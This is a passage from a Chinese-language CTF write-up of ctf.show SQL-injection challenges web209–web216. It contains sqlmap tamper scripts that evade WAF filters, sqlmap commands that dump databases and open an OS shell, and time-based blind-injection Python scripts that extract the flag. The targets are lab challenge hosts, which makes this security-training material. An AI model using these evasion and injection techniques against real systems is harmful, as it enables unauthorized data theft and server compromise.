class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;*&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;=&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">&#x27;like&#x27;</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></table></figure><p><code>*</code>，将其替换为字符 <code>1</code> (<code>chr(0x31)</code>) 并继续处理下一个字符</p><p><code>=</code>，在返回值中插入换行符 (<code>\n</code>)，后跟 <code>'like'</code>，再插入一个换行符</p><h2 id="web210"><a class="markdownIt-Anchor" href="#web210"></a> web210</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$id</span>))));<br></code></pre></td></tr></table></figure><p>这段代码实现了对字符串 <code>$id</code> 的双重 Base64 解码和反转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web210<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx -dump --tamper=web210<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = payload[::-<span class="hljs-number">1</span>].encode()<br>    payload = base64.b64encode(payload)<br>    payload = (payload.decode())[::-<span class="hljs-number">1</span>]<br>    payload = base64.b64encode(payload.encode())<br>    <span class="hljs-keyword">return</span> payload.decode()<br></code></pre></td></tr></table></figure><h2 id="web211"><a class="markdownIt-Anchor" href="#web211"></a> web211</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ /&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在上一题的基础上加了一个空格绕过，稍微微调一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>           <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web211<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa -dump --tamper=web211<br></code></pre></td></tr></table></figure><h2 id="web212"><a class="markdownIt-Anchor" href="#web212"></a> web212</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$id</span>))));<br>  &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*/&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>加了这些限制，继续修改脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;*&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web212<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa -dump --tamper=web212<br></code></pre></td></tr></table></figure><h2 id="web213"><a class="markdownIt-Anchor" href="#web213"></a> web213</h2><p>练习使用–os-shell 一键getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web212<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_user -C username -dump --tamper=web212<br></code></pre></td></tr></table></figure><p>用上一题的可以直接打通但是找不到就提的flag在哪，所以需要getshell才行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1  --tamper=web212 --os-shell<br></code></pre></td></tr></table></figure><p>按4，1然后上传文件，然后执行命令</p><h2 id="web214"><a class="markdownIt-Anchor" href="#web214"></a> web214</h2><p>这题开始是时间盲注，配合bp食用更佳</p><p>找不到注入点，orz,看了一下wp需要抓包，在api里面找到，直接上吧，设置debug=1,注入点是ip，</p><p>这里根据web175的进行微调一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://9a47d60c-a58c-473d-8fda-bcd4534a6d2a.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        <span class="hljs-comment">#payload = &#123;&quot;ip&quot;:f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.5),0)&quot;,&#x27;debug&#x27;:1&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&quot;ip&quot;:f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.5),0)&quot;,&#x27;debug&#x27;:1&#125;</span><br>        payload = &#123;<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;if(substr((select flaga from ctfshow_flagx),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.5),0)&quot;</span>,<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-number">1</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>写代码中dict的逗号不能少，是我在改代码中遇到的一个小问题</p><h2 id="web215"><a class="markdownIt-Anchor" href="#web215"></a> web215</h2><p>用了单引号</p><p>和上题基本一致，用了引号就需要记得闭合，%23过滤掉后面的即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://fcff0b3a-2480-4088-88e3-4a8554259ae8.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0&#x27; or if(substr((select flagaa from ctfshow_flagxc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(1),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>需要闭合，所以调整了一下payload的顺序，在爆表的时候出现了数字异常，手动调一下就行，最后可以得到flag</p><h2 id="web216"><a class="markdownIt-Anchor" href="#web216"></a> web216</h2><p>where id = from_base64($id);</p><p>一开始以为是需要对payload进行base64的转化，其实就是)的提前闭合就可以了，可以沿用上一题的脚本，微调一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 